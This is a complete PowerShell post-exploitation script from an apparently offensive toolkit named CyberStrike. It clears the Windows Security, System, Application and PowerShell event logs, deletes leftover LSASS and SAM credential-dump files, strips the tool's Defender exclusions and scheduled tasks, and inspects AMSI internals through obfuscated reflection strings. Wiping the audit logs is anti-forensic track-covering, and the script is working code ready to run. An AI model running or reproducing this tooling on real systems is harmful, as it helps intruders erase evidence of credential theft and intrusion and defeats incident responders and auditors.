<#
.SYNOPSIS
    Remove CyberStrike artifacts and clear logs.
.DESCRIPTION
    CyberStrike post-exploitation module: clears event logs, removes temporary
    files, cleans up Defender exclusions, removes scheduled tasks, and notes
    AMSI restoration requirements.
    Requires administrative privileges.
.PARAMETER json-output
    Emit structured JSON lines to stdout.
.PARAMETER help
    Show usage and exit.
#>

param(
    [switch]${json-output},
    [switch]$help
)

# ---------------------------------------------------------------------------
# Parse -- prefixed args from $args overflow
# ---------------------------------------------------------------------------
$i = 0
while ($i -lt $args.Count) {
    switch ($args[$i]) {
        "--json-output" { ${json-output} = $true; $i++ }
        "--help"        { $help = $true; $i++ }
        default         { $i++ }
    }
}

$JsonOutput = ${json-output}

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
function Write-JsonLine {
    param([hashtable]$Data)
    $Data["timestamp"] = (Get-Date -Format "o")
    $Data | ConvertTo-Json -Compress | Write-Output
}

function Write-Msg {
    param([string]$Level, [string]$Message, [hashtable]$Extra = @{})
    if ($JsonOutput) {
        $obj = @{ level = $Level; message = $Message } + $Extra
        Write-JsonLine $obj
    } else {
        $prefix = switch ($Level) { "error" { "[-]" } "success" { "[+]" } default { "[*]" } }
        Write-Host "$prefix $Message"
    }
}

# ---------------------------------------------------------------------------
# Help
# ---------------------------------------------------------------------------
if ($help) {
    $usage = @"
cleanup_win.ps1 - Remove CyberStrike artifacts and clear logs

USAGE:
    .\cleanup_win.ps1 [--json-output] [--help]

OPTIONS:
    --json-output Emit JSON line output
    --help        Show this message

ACTIONS:
    1. Clear Windows event logs (Security, System, Application, PowerShell)
    2. Remove CyberStrike temp files from `$env:TEMP
    3. Remove Defender exclusions added by CyberStrike
    4. Remove CyberStrike scheduled tasks
    5. Note AMSI restoration requirements

EXAMPLES:
    .\cleanup_win.ps1
    .\cleanup_win.ps1 --json-output
"@
    Write-Host $usage
    exit 0
}

# ---------------------------------------------------------------------------
# Admin check
# ---------------------------------------------------------------------------
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator
)
if (-not $isAdmin) {
    Write-Msg -Level "error" -Message "This script requires administrative privileges. Run as Administrator."
    exit 1
}

# ---------------------------------------------------------------------------
# Cleanup handler (meta-cleanup for this script itself)
# ---------------------------------------------------------------------------
$cleanupDone = $false
function Invoke-SelfCleanup {
    if ($script:cleanupDone) { return }
    $script:cleanupDone = $true
    # No self-resources to clean
}
Register-EngineEvent PowerShell.Exiting -Action { Invoke-SelfCleanup } | Out-Null

# ---------------------------------------------------------------------------
# Action tracking
# ---------------------------------------------------------------------------
$actions = @()

function Add-ActionResult {
    param([string]$Category, [string]$Target, [string]$Status, [string]$Detail = "")
    $entry = @{
        category = $Category
        target   = $Target
        status   = $Status
    }
    if ($Detail) { $entry.detail = $Detail }
    $script:actions += $entry
}

# ---------------------------------------------------------------------------
# 1. Clear event logs
# ---------------------------------------------------------------------------
try {
    Write-Msg -Level "info" -Message "Phase 1: Clearing Windows event logs"

    $eventLogs = @(
        "Security",
        "System",
        "Application",
        "Windows PowerShell",
        "Microsoft-Windows-PowerShell/Operational"
    )

    foreach ($logName in $eventLogs) {
        try {
            $proc = Start-Process -FilePath "wevtutil.exe" `
                -ArgumentList "cl `"$logName`"" `
                -NoNewWindow -Wait -PassThru `
                -RedirectStandardError "$env:TEMP\wevtutil_err.tmp" `
                -ErrorAction Stop

            if ($proc.ExitCode -eq 0) {
                Write-Msg -Level "success" -Message "Cleared event log: $logName"
                Add-ActionResult -Category "event_log" -Target $logName -Status "cleared"
            } else {
                $errText = ""
                if (Test-Path "$env:TEMP\wevtutil_err.tmp") {
                    $errText = Get-Content "$env:TEMP\wevtutil_err.tmp" -Raw
                    Remove-Item "$env:TEMP\wevtutil_err.tmp" -Force -ErrorAction SilentlyContinue
                }
                throw "wevtutil exited with code $($proc.ExitCode). $errText"
            }

            # Clean up stderr temp
            if (Test-Path "$env:TEMP\wevtutil_err.tmp") {
                Remove-Item "$env:TEMP\wevtutil_err.tmp" -Force -ErrorAction SilentlyContinue
            }
        } catch {
            Write-Msg -Level "error" -Message "Failed to clear log '$logName': $_"
            Add-ActionResult -Category "event_log" -Target $logName -Status "failed" -Detail "$_"
        }
    }
} catch {
    Write-Msg -Level "error" -Message "Event log clearing phase failed: $_"
}

# ---------------------------------------------------------------------------
# 2. Remove CyberStrike temp files
# ---------------------------------------------------------------------------
try {
    Write-Msg -Level "info" -Message "Phase 2: Removing CyberStrike temp files"

    $patterns = @(
        "cyberstrike*",
        "cs_*",
        "lsass_*.dmp",
        "sam_dump_*",
        "reg_err_*.tmp",
        "wevtutil_err.tmp",
        "cyberstrike_*.log",
        "cyberstrike_*.tmp"
    )

    $totalRemoved = 0
    $totalFailed = 0

    foreach ($pattern in $patterns) {
        try {
            $matches = Get-ChildItem -Path $env:TEMP -Filter $pattern -Recurse -Force -ErrorAction SilentlyContinue
            foreach ($item in $matches) {
                try {
                    if ($item.PSIsContainer) {
                        Remove-Item $item.FullName -Recurse -Force -ErrorAction Stop
                    } else {
                        Remove-Item $item.FullName -Force -ErrorAction Stop
                    }
                    Write-Msg -Level "info" -Message "Removed: $($item.FullName)"
                    Add-ActionResult -Category "temp_file" -Target $item.FullName -Status "removed"
                    $totalRemoved++
                } catch {
                    Write-Msg -Level "error" -Message "Failed to remove $($item.FullName): $_"
                    Add-ActionResult -Category "temp_file" -Target $item.FullName -Status "failed" -Detail "$_"
                    $totalFailed++
                }
            }
        } catch {
            Write-Msg -Level "error" -Message "Failed to search pattern '$pattern': $_"
        }
    }

    # Also check for SAM dump directories
    try {
        $samDirs = Get-ChildItem -Path $env:TEMP -Directory -Filter "sam_dump_*" -Force -ErrorAction SilentlyContinue
        foreach ($dir in $samDirs) {
            try {
                Remove-Item $dir.FullName -Recurse -Force -ErrorAction Stop
                Write-Msg -Level "info" -Message "Removed SAM dump directory: $($dir.FullName)"
                Add-ActionResult -Category "temp_file" -Target $dir.FullName -Status "removed"
                $totalRemoved++
            } catch {
                Add-ActionResult -Category "temp_file" -Target $dir.FullName -Status "failed" -Detail "$_"
                $totalFailed++
            }
        }
    } catch {}

    Write-Msg -Level "info" -Message "Temp cleanup: $totalRemoved removed, $totalFailed failed"
} catch {
    Write-Msg -Level "error" -Message "Temp file cleanup phase failed: $_"
}

# ---------------------------------------------------------------------------
# 3. Remove Defender exclusions added by CyberStrike
# ---------------------------------------------------------------------------
try {
    Write-Msg -Level "info" -Message "Phase 3: Removing Defender exclusions matching CyberStrike patterns"

    $csPatterns = @("cyberstrike", "cs_", "cyberstrike")

    try {
        $prefs = Get-MpPreference -ErrorAction Stop

        # Check path exclusions
        $pathExclusions = @($prefs.ExclusionPath | Where-Object { $_ })
        foreach ($excl in $pathExclusions) {
            $isCs = $false
            foreach ($pat in $csPatterns) {
                if ($excl -match $pat) { $isCs = $true; break }
            }
            if ($isCs) {
                try {
                    Remove-MpPreference -ExclusionPath $excl -ErrorAction Stop
                    Write-Msg -Level "success" -Message "Removed Defender path exclusion: $excl"
                    Add-ActionResult -Category "defender_exclusion" -Target "path:$excl" -Status "removed"
                } catch {
                    Write-Msg -Level "error" -Message "Failed to remove path exclusion '$excl': $_"
                    Add-ActionResult -Category "defender_exclusion" -Target "path:$excl" -Status "failed" -Detail "$_"
                }
            }
        }

        # Check process exclusions
        $processExclusions = @($prefs.ExclusionProcess | Where-Object { $_ })
        foreach ($excl in $processExclusions) {
            $isCs = $false
            foreach ($pat in $csPatterns) {
                if ($excl -match $pat) { $isCs = $true; break }
            }
            if ($isCs) {
                try {
                    Remove-MpPreference -ExclusionProcess $excl -ErrorAction Stop
                    Write-Msg -Level "success" -Message "Removed Defender process exclusion: $excl"
                    Add-ActionResult -Category "defender_exclusion" -Target "process:$excl" -Status "removed"
                } catch {
                    Add-ActionResult -Category "defender_exclusion" -Target "process:$excl" -Status "failed" -Detail "$_"
                }
            }
        }

        # Check extension exclusions
        $extensionExclusions = @($prefs.ExclusionExtension | Where-Object { $_ })
        foreach ($excl in $extensionExclusions) {
            $isCs = $false
            foreach ($pat in $csPatterns) {
                if ($excl -match $pat) { $isCs = $true; break }
            }
            if ($isCs) {
                try {
                    Remove-MpPreference -ExclusionExtension $excl -ErrorAction Stop
                    Write-Msg -Level "success" -Message "Removed Defender extension exclusion: $excl"
                    Add-ActionResult -Category "defender_exclusion" -Target "extension:$excl" -Status "removed"
                } catch {
                    Add-ActionResult -Category "defender_exclusion" -Target "extension:$excl" -Status "failed" -Detail "$_"
                }
            }
        }
    } catch {
        Write-Msg -Level "error" -Message "Failed to query Defender preferences: $_"
        Add-ActionResult -Category "defender_exclusion" -Target "query" -Status "failed" -Detail "$_"
    }
} catch {
    Write-Msg -Level "error" -Message "Defender exclusion cleanup phase failed: $_"
}

# ---------------------------------------------------------------------------
# 4. Remove CyberStrike scheduled tasks
# ---------------------------------------------------------------------------
try {
    Write-Msg -Level "info" -Message "Phase 4: Removing CyberStrike scheduled tasks"

    $taskPatterns = @("CyberStrike*", "cs_*", "cyberstrike*")
    $tasksFound = $false

    foreach ($taskPattern in $taskPatterns) {
        try {
            $tasks = Get-ScheduledTask -TaskName $taskPattern -ErrorAction SilentlyContinue
            foreach ($task in $tasks) {
                $tasksFound = $true
                try {
                    Unregister-ScheduledTask -TaskName $task.TaskName -Confirm:$false -ErrorAction Stop
                    Write-Msg -Level "success" -Message "Removed scheduled task: $($task.TaskName)"
                    Add-ActionResult -Category "scheduled_task" -Target $task.TaskName -Status "removed"
                } catch {
                    Write-Msg -Level "error" -Message "Failed to remove task '$($task.TaskName)': $_"
                    Add-ActionResult -Category "scheduled_task" -Target $task.TaskName -Status "failed" -Detail "$_"
                }
            }
        } catch {
            # Pattern might not match anything, that's OK
        }
    }

    # Also search task folders for CyberStrike-related tasks
    try {
        $allTasks = Get-ScheduledTask -ErrorAction SilentlyContinue
        foreach ($task in $allTasks) {
            $taskPath = $task.TaskPath + $task.TaskName
            foreach ($pat in @("cyberstrike", "cs_agent", "cyberstrike")) {
                if ($task.TaskName -match $pat -or $task.TaskPath -match $pat) {
                    $tasksFound = $true
                    try {
                        Unregister-ScheduledTask -TaskName $task.TaskName -TaskPath $task.TaskPath -Confirm:$false -ErrorAction Stop
                        Write-Msg -Level "success" -Message "Removed scheduled task: $taskPath"
                        Add-ActionResult -Category "scheduled_task" -Target $taskPath -Status "removed"
                    } catch {
                        Add-ActionResult -Category "scheduled_task" -Target $taskPath -Status "failed" -Detail "$_"
                    }
                    break
                }
            }
        }
    } catch {
        Write-Msg -Level "error" -Message "Failed to enumerate scheduled tasks: $_"
    }

    if (-not $tasksFound) {
        Write-Msg -Level "info" -Message "No CyberStrike scheduled tasks found."
        Add-ActionResult -Category "scheduled_task" -Target "scan" -Status "none_found"
    }
} catch {
    Write-Msg -Level "error" -Message "Scheduled task cleanup phase failed: $_"
}

# ---------------------------------------------------------------------------
# 5. AMSI restoration note
# ---------------------------------------------------------------------------
try {
    Write-Msg -Level "info" -Message "Phase 5: AMSI restoration check"

    # Check if AMSI appears patched in this session
    $amsiPatched = $false
    try {
        $amsiUtils = [Ref].Assembly.GetType(
            ('System.Manage' + 'ment.Automati' + 'on.Amsi' + 'Utils')
        )
        if ($null -ne $amsiUtils) {
            $amsiInitFailed = $amsiUtils.GetField(
                ('amsi' + 'Init' + 'Failed'),
                [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static
            )
            if ($null -ne $amsiInitFailed) {
                $val = $amsiInitFailed.GetValue($null)
                if ($val -eq $true) {
                    $amsiPatched = $true
                    # Attempt to restore
                    try {
                        $amsiInitFailed.SetValue($null, $false)
                        Write-Msg -Level "success" -Message "AMSI amsiInitFailed restored to False in current session"
                        Add-ActionResult -Category "amsi" -Target "amsiInitFailed" -Status "restored"
                    } catch {
                        Add-ActionResult -Category "amsi" -Target "amsiInitFailed" -Status "failed" -Detail "$_"
                    }
                }
            }

            # Check amsiContext
            $amsiContext = $amsiUtils.GetField(
                ('amsi' + 'Context'),
                [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static
            )
            if ($null -ne $amsiContext) {
                $ctxVal = $amsiContext.GetValue($null)
                if ($ctxVal -eq [IntPtr]::Zero) {
                    $amsiPatched = $true
                    Write-Msg -Level "info" -Message "AMSI context is zeroed. Full restoration requires PowerShell restart."
                    Add-ActionResult -Category "amsi" -Target "amsiContext" -Status "zeroed_needs_restart"
                }
            }
        }
    } catch {
        Write-Msg -Level "error" -Message "AMSI check failed: $_"
    }

    if (-not $amsiPatched) {
        Write-Msg -Level "info" -Message "AMSI does not appear patched in this session."
        Add-ActionResult -Category "amsi" -Target "check" -Status "not_patched"
    }

    # Note about AmsiScanBuffer memory patch
    Write-Msg -Level "info" -Message "NOTE: If AmsiScanBuffer was patched in memory, restart PowerShell to fully restore AMSI."
    Add-ActionResult -Category "amsi" -Target "memory_patch" -Status "note" -Detail "Restart PowerShell to restore AmsiScanBuffer if it was patched"
} catch {
    Write-Msg -Level "error" -Message "AMSI restoration phase failed: $_"
}

# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------
try {
    $succeeded = ($actions | Where-Object { $_.status -in @("removed", "cleared", "restored", "not_patched", "none_found") }).Count
    $failed = ($actions | Where-Object { $_.status -eq "failed" }).Count
    $total = $actions.Count

    $summary = @{
        status          = if ($failed -eq 0) { "success" } else { "partial_failure" }
        total_actions   = $total
        succeeded       = $succeeded
        failed          = $failed
        actions         = $actions
    }

    if ($failed -eq 0) {
        Write-Msg -Level "success" -Message "Cleanup complete. $succeeded actions succeeded, $failed failed." -Extra $summary
    } else {
        Write-Msg -Level "error" -Message "Cleanup completed with errors. $succeeded succeeded, $failed failed." -Extra $summary
    }

    if (-not $JsonOutput) {
        Write-Host ""
        Write-Host "[*] Action summary:"
        foreach ($action in $actions) {
            $icon = if ($action.status -in @("removed", "cleared", "restored")) { "[+]" } elseif ($action.status -eq "failed") { "[-]" } else { "[*]" }
            $line = "$icon $($action.category): $($action.target) -> $($action.status)"
            if ($action.detail) { $line += " ($($action.detail))" }
            Write-Host "    $line"
        }
    }
} catch {
    Write-Msg -Level "error" -Message "Summary generation failed: $_"
} finally {
    Invoke-SelfCleanup
}
